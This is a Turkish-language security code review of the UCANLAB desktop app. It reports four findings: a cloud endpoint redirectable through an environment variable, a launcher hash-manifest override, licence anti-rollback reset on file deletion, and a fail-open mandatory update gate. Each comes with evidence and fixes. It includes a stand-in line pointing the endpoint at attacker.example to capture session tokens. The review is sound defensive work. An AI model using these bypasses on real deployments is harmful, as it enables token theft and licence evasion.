# UCANLAB Kod Review — Aşama 4

- **İncelenen revizyon:** `011b83599836c7f5b9b51c0f946565684d505ca8`
- **Kapsam:** cloud istemcisi, lisans aktivasyonu ve offline doğrulama, launcher preflight/update bütünlüğü, secret provider, HWID, telemetry uploader ve knowledge-pack güvenlik sınırları.
- **Yaklaşım:** İlgili bulgu dosyalarının tamamı okundu; mevcut testler çalıştırıldı; şüpheli durumlar izole probe ve statik çağrı zinciri takibiyle doğrulandı.
- **Kısıt:** Bu aşamada kaynak koduna, testlere veya konfigürasyona hiçbir değişiklik uygulanmadı.

## Yönetici özeti

Bu aşamada 2 yüksek ve 2 orta önem seviyesinde bulgu tespit edildi. En kritik riskler, üretim cloud endpoint'inin ortam değişkeniyle sınırsız biçimde değiştirilebilmesi ve frozen launcher'da hedef hash manifestinin yine ortam değişkeniyle değiştirilebilmesidir. Bu iki kontrol, oturum/device token sızıntısı ve değiştirilmiş binary çalıştırılması için güven sınırını zayıflatıyor.

## Bulgular

### H1 — Üretim cloud endpoint'i herhangi bir HTTPS host'a yönlendirilebiliyor

**Önem:** HIGH (ortam değişkenleri güvenilmeyen bir başlatıcı/üst süreç tarafından kontrol edilebiliyorsa)  
**Dosyalar:**

- `src/ui/desktop_app.py:103-119`
- `src/security/cloud/client.py:123-145`
- `src/security/cloud/client.py:330-369`
- `src/launcher/auth.py:55-63`

**Kanıt:**

`_resolve_cloud_base_url()` `UCANLAB_CLOUD_BASE_URL` değerini herhangi bir HTTPS URL olarak kabul ediyor. `CloudConfig._validate_scheme()` yalnızca şema kontrolü yapıyor; HTTPS host için allowlist uygulamıyor. Aynı resolver launcher tarafından da kullanılıyor.

`CloudClient.request()` ise DPAPI/SecretProvider'dan okunan `CLOUD_SESSION_TOKEN` değerini `Cookie: ucan_session=...` olarak seçilen endpoint'e gönderiyor. Böylece süreç ortamı:

```text
UCANLAB_CLOUD_BASE_URL=https://attacker.example
```

şeklinde hazırlanırsa uygulama cloud health, auth, registration, activation veya telemetry çağrılarını saldırganın HTTPS sunucusuna yönlendirebilir. HTTPS kullanılması bu durumda sızıntıyı önlemez; yalnızca saldırganla TLS kurar.

UI'daki `cloud_test_connection` ve `cloud_save_config` allowlist'i bu yolu tamamen kapatmıyor; ortam değişkeni doğrudan resolver'a girdiği için bridge allowlist'i bypass edilebiliyor.

**Çözüm:**

1. Frozen/production build'de `UCANLAB_CLOUD_BASE_URL` override'ını tamamen kapatın veya yalnızca imzalı build-time configuration'dan kabul edin.
2. Cloud endpoint için ortak bir canonical allowlist uygulayın: host, şema ve gerekiyorsa port birlikte doğrulansın.
3. Development endpoint'i yalnızca açık bir non-frozen/dev flag'i ile etkinleştirin; bu flag'in üretim binary'sinde etkisiz olduğunu test edin.
4. İstek yapılmadan önce canonical origin'i log'a token içermeden yazın ve allowlist dışı endpoint'te fail-closed davranın.
5. Test ekleyin: üretim modunda `https://attacker.example`, HTTPS allowlist dışı host ve URL userinfo/port varyantları reddedilmeli; yalnızca resmi hostlar ve açıkça seçilmiş loopback dev endpoint kabul edilmeli.

---

### H2 — Frozen launcher, hedef hash manifestini ortam değişkeniyle değiştirmeye izin veriyor

**Önem:** HIGH (frozen binary bütünlüğü için)  
**Dosyalar:**

- `src/launcher/app.py:41-56`
- `src/launcher/app.py:373-414`

**Kanıt:**

Launcher, frozen build'de hedef executable için hash kontrolü yapıyor. Ancak `_manifest_path()` şu kontrolü yapmadan `UCANLAB_TARGET_MANIFEST` değerini kullanıyor:

```python
override = os.environ.get(TARGET_MANIFEST_ENV, "").strip()
if override:
    return Path(override)
```

`verify_resolved_target()` frozen `.exe` için `_load_target_manifest()` çağırıyor; bu da override edilmiş manifestten beklenen hash'i okuyor. Dolayısıyla saldırgan süreç ortamını ve hedef binary'yi etkileyebiliyorsa, değiştirilmiş executable'ın hash'ini içeren kendi manifestini göstererek D-4 bütünlük kapısını geçebilir.

Kodun diğer bölümlerinde (`_dev_override_enabled`, `_unsigned_manifest_allowed`) frozen build kontrolü açıkça uygulanmışken target manifest override'ında aynı koruma yok. Mevcut testler ortam değişkeni üzerinden manifest override'ını doğruluyor, fakat frozen modda bu override'ın reddedilmesini doğrulamıyor.

**Çözüm:**

- Frozen build'de `UCANLAB_TARGET_MANIFEST` override'ını yok sayın; manifest yolu yalnızca paketlenmiş, sabit ve yazılabilir olmayan güven kökünden türetilsin.
- Test/packaging override'ını `not sys.frozen` ile sınırlandırın.
- Daha güçlü çözüm olarak hash manifestinin kendisini imzalı bir manifest olarak paketleyin; yalnızca hash dosyasını korumak, manifest yazılabilir ise yeterli değildir.
- Frozen test ekleyin: `sys.frozen=True` iken ortam değişkeni saldırgan manifestine işaret etse bile `verify_resolved_target()` paketlenmiş manifesti kullanmalı veya fail-closed reddetmeli.

---

### M1 — Cloud lisans HWM dosyası silinince anti-rollback durumu boot zamanına sıfırlanıyor

**Önem:** MEDIUM-HIGH (yerel uygulama veri dizinine yazabilen saldırgan veya bozuk depolama modeli için)  
**Dosya:** `src/security/cloud/license_flow.py:209-231`

**Kanıt:**

`_load_persistent_hwm()` HWM dosyası yoksa, bozuksa veya HMAC doğrulaması başarısızsa `fallback` değerini döndürüyor. Bu davranış docstring'de açıkça “fail-open to boot time” olarak belirtilmiş.

İzole probe sonucu:

```text
hwm_exists_after_persist: True
restored_hwm: 2000100.0
hwm_after_delete: 1000000
```

İlk instance geçmişteki yüksek HWM değerini yazdı. İkinci instance bu değeri geri yükledi. Dosya silindikten sonra üçüncü instance eski HWM yerine yeni boot zamanını kabul etti.

Bu, sistem saati geriye alındığında veya offline lisans süresi kötüye kullanılmak istendiğinde persistent anti-rollback kontrolünün silme/tahrif etme yoluyla devre dışı bırakılmasına izin veriyor. Aynı repository'deki `LicenseValidator` daha sert HWM davranışına sahipken `LicenseFlow` daha zayıf davranıyor.

**Çözüm:**

1. İlk kurulum ile daha önce HWM yazılmış olması durumunu ayıran, SecretProvider ile korunan bir “HWM initialized” marker tutun.
2. Marker mevcut olup HWM dosyası yoksa veya doğrulanamıyorsa lisansı geçersiz/unknown kabul edin; boot zamanına sessizce sıfırlamayın.
3. HMAC başarısızlığında dosyayı karantinaya almak tek başına yeterli değil; lisans doğrulaması da fail-closed olmalı.
4. HWM persistence hatası mevcut oturumda yalnızca warning olarak kalmamalı; üretim lisans kontrolünün durumunu `HWM_UNAVAILABLE` olarak işaretlemeli.
5. Test ekleyin: persist edilmiş HWM dosyasını silme, truncate etme, HMAC değiştirme ve path erişim hatası sonrasında saat rollback'inin kabul edilmediğini doğrulayın.

---

### M2 — Mandatory update obligation kalıcılaştırma/okuma hatalarında launch kapısı fail-open kalabiliyor

**Önem:** MEDIUM  
**Dosya:** `src/launcher/app.py:291-347`

**Kanıt:**

`run_preflight()` başarısız bir update check sonrasında daha önce kaydedilmiş mandatory obligation'ı arıyor. Ancak `_load_recorded_mandatory_obligation()` dosya okuma sırasında `OSError` oluştuğunda `None` döndürüyor:

```python
except OSError:
    return None
```

`None`, obligation yokmuş gibi yorumlanıyor. Aynı şekilde `_record_mandatory_obligation()` obligation dosyasını yazamazsa yalnızca warning log'luyor ve normal bir dönüş yapıyor. İlk başarılı update check mandatory update bildirdikten sonra yazma başarısız olursa, sonraki açılışta update endpoint'i erişilemez olduğunda kalıcı obligation bulunamayacak ve launcher yeni kuruluma benzer şekilde launch edebilecek.

Bu davranış, yorumlarda belirtilen “fail-closed” hedefiyle çelişiyor. Disk permission, read-only filesystem, path hijack veya bozuk storage gibi durumlar mandatory update güvenlik kararını etkiliyor.

**Çözüm:**

- Obligation dosyası okunamıyorsa `None` yerine “state unavailable/tampered” sonucu döndürün ve başarısız update check ile birlikte launch'ı durdurun.
- Mandatory obligation yazılamazsa aynı preflight çağrısının sonucunu fail-closed tutun ve yükümlülüğün kalıcılaştırılamadığını rapora ekleyin.
- HMAC anahtarını ve obligation state'ini güvenilir uygulama veri kökünde tutun; yazma/okuma başarısızlığını ayrı bir güvenlik durumuyla raporlayın.
- Test ekleyin: obligation path bir dosya/erişilemez dizin olduğunda, network update check başarısızsa `can_launch=False` olmalı.

---

## İncelenen fakat bu aşamada doğrulanmış bulguya dönüştürülmeyen alanlar

- `src/security/cloud/telemetry_uploader.py`: session-id path injection, chunk sınırları ve VIN consent akışı incelendi; bu aşamada doğrulanmış kritik bir bypass bulunmadı. Uploader'ın nihai bütünlük garantisi backend'in complete aşamasında SHA-256 doğrulaması yapmasına bağlı; mevcut local mock test bunu doğrulamıyor.
- `src/safety/secret_provider.py`: POSIX AES-GCM/0600, Windows DPAPI fallback ve ephemeral backend akışları incelendi. Üretim wiring'inde ephemeral fallback'in açıkça engellendiğini ayrıca deployment testleriyle garanti etmek gerekir; bu aşamada lisans bypass'ı olarak doğrulanmış bir akış raporlanmadı.
- `src/security/knowledge_pack/pack_loader.py`, `src/security/hwid/collector.py`, `src/security/anti_tamper/guard.py`: imza, key binding, input allowlist ve fail-closed kontrolleri incelendi; bu aşamada yeni doğrulanmış HIGH bulgu çıkarılmadı.

## Doğrulama

Çalıştırılan hedef testler:

```text
139 passed in 1.75s
```

Çalıştırılan lint:

```text
ruff check ...
All checks passed!
```

Ek probe:

- Cloud LicenseFlow HWM persist edildiğinde yeniden yükleniyor; dosya silindiğinde değer boot zamanına sıfırlanıyor.
- Hedef cloud ve launcher akışlarında güvenlik kararlarının environment override'larına bağlı olduğu kaynak çağrı zincirinden doğrulandı.

Mevcut testlerin geçmesi, H1/H2/M1/M2 senaryolarının tamamını kapsadığı anlamına gelmiyor. Bu aşamada yeni test veya kaynak kodu eklenmedi.

## Öncelikli inceleme sırası

1. **H1:** Cloud endpoint güvenini environment yerine sabit/imzalı production configuration'a bağlayın.
2. **H2:** Frozen build'de target manifest environment override'ını kapatın.
3. **M1:** Cloud HWM silinmesi/tahrifinde anti-rollback durumunu fail-closed yapın.
4. **M2:** Mandatory update obligation storage/read hatalarını launch engelleyen duruma yükseltin.

Bu aşamada review durduruldu; uygulama yapılmadı.
